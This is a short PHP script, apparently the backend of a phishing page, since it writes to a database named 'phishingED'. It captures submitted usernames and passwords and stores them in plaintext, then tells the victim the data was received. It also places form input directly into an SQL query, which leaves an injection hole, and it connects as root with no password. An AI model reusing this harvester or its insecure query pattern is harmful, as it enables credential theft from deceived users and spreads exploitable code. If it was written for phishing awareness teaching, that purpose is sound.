<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$conn = new mysqli("localhost", "root", "", "phishingED");

if ($conn->connect_error) {
    die("Error de conexión: " . $conn->connect_error);
}

$usuario = $_POST['usuario'];
$pass = $_POST['pass'];

$sql = "INSERT INTO usuarios(usuario, pass) VALUES ('$usuario', '$pass')";
if ($conn->query($sql) === TRUE) {
    echo "¡Datos recibidos correctamente!";
} else {
    echo "Error: " . $conn->error;
}

$conn->close();
?>
